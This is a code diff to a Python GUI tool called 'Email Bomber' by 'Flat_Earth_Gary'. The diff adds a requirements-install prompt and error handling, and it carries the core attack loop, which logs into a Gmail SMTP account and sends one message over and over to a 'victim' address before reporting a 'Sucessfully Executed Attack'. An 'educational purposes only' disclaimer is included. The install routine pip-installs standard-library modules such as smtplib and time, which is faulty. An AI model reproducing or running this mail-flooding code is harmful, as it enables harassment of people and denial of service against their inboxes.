@@ -5,11 +5,20 @@ import time
 import MailBomber_banner
 import colorama
 import PySimpleGUI as sg
+import os
 
 
 class MainProgram:
 
     def __init__(self):
+        print("\x1b[35m" + "{+}{-} Email Bomber V1.0 {-}{+}")
+        print("\nDo you want to automatically install the requirements? (Y/N) This is highly recommended, it does not hurt to do it even though you already have them installed!")
+        req = str(input("> ")).lower()
+        if req == "n":
+            pass
+        else:
+            self.install_requirements()
+
         print(colorama.Fore.GREEN + "{+}{-} Email Bomber V1.0 {-}{+}")
         print(colorama.Fore.GREEN +
               "{+}{-} Made by Flat_Earth_Gary {-}{+}", end="")
@@ -143,48 +152,53 @@ class MainProgram:
             self.msg = """From: %s\nSubject: %s\nTo/Victim: %s\n%s""" % (
                 self.from_mail, self.subject, self.victim, self.message)
 
-            if event == "CLOSE":
+            try:
+
+                if event == "CLOSE":
+                    window.close()
+                    interruption()
+                elif event == "INFO":
+                    sg.popup("""
+                    Mail Bomber made by Flat_Earth_Gary
+
+                    
+                    This project is made for educational purposes only.
+                    I take no responsibility what so ever with what you do with this software.
+                    If you want to contribute, go ahead. I'd appreciate if you'd give credit though.
+
+                    Source available at my Github: github.com/FlatEarthGary
+
+                    USE:
+                    If you encounter error with logging in you most likely haven't set up "allow less secure apps" in your gmail. Be sure to do that and try again, it should work.
+                    Thank you have a great day!
+
+                    """, title="Info regarding use of the software")
+                elif event == "READY?":
+                    sg.popup("Setting up mailserver",
+                             title="Setting up mailserver")
+
+                    self.s = smtplib.SMTP(self.server, self.port)
+                    self.s.ehlo()
+                    time.sleep(0.1)
+                    self.s.starttls()
+                    time.sleep(0.1)
+                    self.s.login(self.from_mail, self.psw)
+
+                    sg.popup(
+                        "Successfully established connection and logged in. You can safely shut down this window.")
+                    sg.popup(
+                        "Starting sending mails. Close this window and it'll start. Nothing will happen untill it has finished, then you'll get a popup.")
+                    for mail in range(int(self.amount)):
+                        self.s.sendmail(self.from_mail, self.victim, self.msg)
+                        self.amount += 1
+                        if self.count == int(self.amount):
+                            self.s.close()
+                    self.s.close()
+                    sg.popup(
+                        "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (int(self.amount / 2)))
+            except Exception:
                 window.close()
-                interruption()
-            elif event == "INFO":
-                sg.popup("""
-                Mail Bomber made by Flat_Earth_Gary
-
-                
-                This project is made for educational purposes only.
-                I take no responsibility what so ever with what you do with this software.
-                If you want to contribute, go ahead. I'd appreciate if you'd give credit though.
-
-                Source available at my Github: github.com/FlatEarthGary
-
-                USE:
-                If you encounter error with logging in you most likely haven't set up "allow less secure apps" in your gmail. Be sure to do that and try again, it should work.
-                Thank you have a great day!
-
-                """, title="Info regarding use of the software")
-            elif event == "READY?":
-                sg.popup("Setting up mailserver",
-                         title="Setting up mailserver")
-
-                self.s = smtplib.SMTP(self.server, self.port)
-                self.s.ehlo()
-                time.sleep(0.1)
-                self.s.starttls()
-                time.sleep(0.1)
-                self.s.login(self.from_mail, self.psw)
-
-                sg.popup(
-                    "Successfully established connection and logged in. You can safely shut down this window.")
-                sg.popup(
-                    "Starting sending mails. Close this window and it'll start. Nothing will happen untill it has finished, then you'll get a popup.")
-                for mail in range(int(self.amount)):
-                    self.s.sendmail(self.from_mail, self.victim, self.msg)
-                    self.amount += 1
-                    if self.count == int(self.amount):
-                        self.s.close()
-                self.s.close()
-                sg.popup(
-                    "{+}{-} Sucessfully Executed Attack (%s) mail sent {-}{+}" % (int(self.amount / 2)))
+                print("You have encountered a error. It's probably because you haven't provided enough information, not enabled 'less secure apps' in Gmail or did not have correct mail or password.")
 
     def Email(self):
         try:
@@ -361,6 +375,20 @@ class MainProgram:
             self.BLAST()
         except Exception:
             pass
+
+    def install_requirements(self):
+
+        print("Installing requirements")
+        os.system("pip install smtplib")
+        os.system("pip install getpass")
+        os.system("pip install time")
+        os.system("pip install colorama")
+        os.system("pip install PySimpleGUI")
+        print(colorama.Fore.LIGHTCYAN_EX +
+              "Successfully installed all the requirements.")
+        print("Booting up the main program")
+        time.sleep(1)
+        os.system("cls")
 
 
 class second_method(MainProgram):
